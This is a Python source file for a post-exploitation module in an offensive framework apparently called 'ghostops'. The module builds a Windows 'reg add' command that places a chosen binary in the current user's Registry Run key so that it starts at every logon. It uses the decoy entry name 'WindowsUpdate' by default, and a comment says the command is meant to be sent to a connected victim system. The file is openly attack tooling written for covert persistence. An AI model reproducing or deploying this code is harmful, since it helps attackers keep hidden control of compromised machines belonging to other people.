from ghostops.core.module_base import BaseModule
from colorama import Fore
import argparse
from ghostops.core.utils import Logger


class WindowsRegRunPersistence(BaseModule):
    module_name = "WindowsRegRunPersistence"
    module_description = (
        "Adds a binary to the Windows Registry Run key for persistence."
    )
    module_author = "Awagat Dhungana <4w4647@gmail.com>"
    module_category = "postexp"
    module_target_os = ["windows"]
    module_target_architecture = ["x86", "x64"]

    @staticmethod
    def add_arguments(parser: argparse.ArgumentParser):
        parser.add_argument(
            "--binary-path",
            required=True,
            help="Full path to the binary to persist (e.g., C:\\\\Users\\\\user\\\\AppData\\\\ghostops.exe)",
        )
        parser.add_argument(
            "--entry-name",
            default="WindowsUpdate",
            help="Name of the registry entry (default: WindowsUpdate)",
        )

    @staticmethod
    def main(args):
        binary_path = args.binary_path
        entry_name = args.entry_name

        command = (
            f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" '
            f'/v "{entry_name}" /t REG_SZ /d "{binary_path}" /f'
        )

        # TODO: Send this command to a connected windows system.
        # Just printing persistence command while i'm working on it.

        Logger.log("good", f"Persistence command: {command}")
